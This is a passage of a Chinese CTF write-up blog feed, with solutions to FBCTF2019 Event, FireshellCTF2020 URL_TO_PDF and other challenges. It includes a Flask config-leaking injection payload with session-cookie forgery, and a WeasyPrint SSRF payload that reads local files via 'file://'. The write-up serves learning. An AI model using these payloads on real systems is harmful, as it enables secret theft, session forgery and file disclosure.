&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        done &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;flag{&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; flag&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;lower() &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还就跑出来了&lt;/p&gt;
&lt;h3 id=&#34;misc&#34;&gt;MISC&lt;/h3&gt;
&lt;h2 id=&#34;签到签到&#34;&gt;[签到]签到&lt;/h2&gt;
&lt;p&gt;flag{Dnui_ctf_2021_s1gn_in}&lt;/p&gt;
&lt;h2 id=&#34;萌新在哪呢&#34;&gt;[萌新]在哪呢&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240223127f86abb2a955642.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240223127f86abb2a955642.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ctrl+f&lt;/p&gt;
&lt;h2 id=&#34;只是个png别想太多了png&#34;&gt;只是个PNG，别想太多了.png&lt;/h2&gt;
&lt;p&gt;binwalk一分，010一看&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240223e27f86abb2a95aced.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240223e27f86abb2a95aced.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;crypto&#34;&gt;CRYPTO&lt;/h3&gt;
&lt;h2 id=&#34;签到键盘侠&#34;&gt;[签到]键盘侠&lt;/h2&gt;
&lt;p&gt;UYTGBNM EDCV UYTGBNM TGBUHM YTFVBH QAZXCDE TYUHN EDCTGBF RFVYGN&lt;/p&gt;
&lt;p&gt;flag{} 提交时括号内为大写字母&lt;/p&gt;
&lt;p&gt;键盘画图&lt;/p&gt;
&lt;p&gt;CLCKOUTHK&lt;/p&gt;
&lt;h2 id=&#34;萌新素数&#34;&gt;[萌新]素数&lt;/h2&gt;
&lt;p&gt;10个不重复的长度&amp;gt;=1024bits的素数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; gmpy2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; gmpy2 &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; mpz
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rs &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; gmpy2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;random_state()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;gen_prime&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; gmpy2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;mpz_urandomb(rs, &lt;span style=&#34;color:#bd93f9&#34;&gt;1024&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;not&lt;/span&gt; gmpy2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;is_prime(p):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        p &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; gmpy2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;add(p, &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; p
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;100&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; gen_prime()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(p)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;多弄几遍，有时候生成的数不是309位整数&lt;/p&gt;
</description>
        </item>
        <item>
        <title>[FBCTF2019]Event</title>
        <link>https://proben1.github.io/2021/fbctf2019event/</link>
        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/fbctf2019event/</guid>
        <description>&lt;h2 id=&#34;fbctf2019event&#34;&gt;[FBCTF2019]Event&lt;/h2&gt;
&lt;p&gt;flask&lt;/p&gt;
&lt;p&gt;没想到在event_important有注入&lt;/p&gt;
&lt;p&gt;猜它可能大概想这样&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; event_name
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;address &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; event_address
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(event_important)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;event_name=1&amp;amp;event_address=1&amp;amp;event_important=__class__.__init__.__globals__[app].config
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;于是查到秘钥&lt;/p&gt;
&lt;p&gt;&lt;code&gt;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;amp;&amp;amp;_ej$tez)$_ik36n8d7o6mr#y&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;解密，出现的是字符串，不是json&lt;/p&gt;
&lt;p&gt;加密&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; flask &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; Flask
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; flask.sessions &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; SecureCookieSessionInterface
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;app &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; Flask(__name__)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;app&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;secret_key &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;amp;&amp;amp;_ej$tez)$_ik36n8d7o6mr#y&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;session_serializer &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; SecureCookieSessionInterface()&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;get_signing_serializer(app)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@app&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;route(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;index&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(session_serializer&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;index()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ImFkbWluIg.YZ92Gw.m7Ax9nFV8ULTllJK2X31bEjyCuU&lt;/p&gt;
</description>
        </item>
        <item>
        <title>[FireshellCTF2020]URL_TO_PDF</title>
        <link>https://proben1.github.io/2021/fireshellctf2020url_to_pdf/</link>
        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/fireshellctf2020url_to_pdf/</guid>
        <description>&lt;h2 id=&#34;fireshellctf2020url-to-pdf&#34;&gt;[FireshellCTF2020]URL TO PDF&lt;/h2&gt;
&lt;p&gt;由于刚刚有些无聊所以再开一道&lt;/p&gt;
&lt;p&gt;开局一个输入框，url转pdf？没见过&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240227e27f86abb2a973232.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240227e27f86abb2a973232.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;弹出下载，但是没法打开，用010来看，可以看到html，猜测爬虫之类的，可以开个服务器看看请求&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@VM-8-15-debian:~# nc -lvp 10004
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listening on [any] 10004 ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;117.21.200.166: inverse host lookup failed: Unknown host
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;connect to [10.0.8.15] from (UNKNOWN) [117.21.200.166] 1519
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GET / HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host: 82.157.174.226:10004
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User-Agent: WeasyPrint 51 (http://weasyprint.org/)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept: */*
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Encoding: gzip, deflate
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connection: close
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;WeasyPrint是啥？没见过&lt;/p&gt;
&lt;p&gt;WeasyPrint 是一个 Python 的虚拟 HTML 和 CSS 渲染引擎，可以用来将网页转成 PDF 文档。旨在支持 Web 标准的打印。&lt;/p&gt;
&lt;p&gt;WeasyPrint 会把所有它支持的东西 都请求一遍然后放在 PDF 里，这里出现了漏洞，在 &lt;code&gt;&amp;lt;link&amp;gt;&lt;/code&gt; 标签内 &lt;code&gt;href&lt;/code&gt; 加载 &lt;code&gt;file://&lt;/code&gt; 实现 SSRF + 任意文件读取&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Weasyprint (the library used here) allows including files into the PDF using &lt;code&gt;&amp;lt;link rel=attachment href=&amp;quot;PATH&amp;quot; /&amp;gt;&lt;/code&gt; in the HTML source for the PDF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;It’s a documented feature&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The information about weasyprint was leaked using a &lt;code&gt;background-image&lt;/code&gt; CSS property to load an attacker-controlled image&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The vendor and version (weasyprint 44) were in the HTTP headers&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;开了个docker，写个html&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;head&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;title&lt;/span&gt;&amp;gt;Captain&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;title&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;head&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;body&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;rel&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;attachment&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;file:///flag&amp;#39;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;body&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;heading&#34;&gt;&lt;/h2&gt;
</description>
        </item>
        <item>
        <title>[NPUCTF2020]验证🐎</title>
        <link>https://proben1.github.io/2021/npuctf2020%E9%AA%8C%E8%AF%81/</link>
        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/npuctf2020%E9%AA%8C%E8%AF%81/</guid>
        <description>&lt;p&gt;js题，长知识了&lt;/p&gt;
&lt;p&gt;F12，ctrl+U查源码&lt;/p&gt;
&lt;p&gt;源码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; express &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;express&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; bodyParser &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;body-parser&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; cookieSession &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;cookie-session&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; fs &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; crypto &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;crypto&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; keys &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;./key.js&amp;#39;&lt;/span&gt;).keys;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt; md5(s) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; crypto.createHash(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;md5&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    .update(s)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    .digest(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt; saferEval(str) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (str.replace(&lt;span style=&#34;color:#f1fa8c&#34;&gt;/(?:Math(?:\.\w+)?)|[()+\-*/&amp;amp;|^%&amp;lt;&amp;gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g&lt;/span&gt;, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;eval&lt;/span&gt;(str);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} &lt;span style=&#34;color:#6272a4&#34;&gt;// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; template &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; fs.readFileSync(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;./index.html&amp;#39;&lt;/span&gt;).toString();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt; render(results) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; template.replace(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;{{results}}&amp;#39;&lt;/span&gt;, results.join(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;lt;br/&amp;gt;&amp;#39;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; app &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; express();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;app.use(bodyParser.urlencoded({ extended&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt; }));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;app.use(bodyParser.json());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;app.use(cookieSession({
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  name&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;PHPSESSION&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#6272a4&#34;&gt;// 2020.3/WORKER2 嘿嘿，给👴爪⑧
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;  keys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;Object&lt;/span&gt;.freeze(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;Object&lt;/span&gt;);
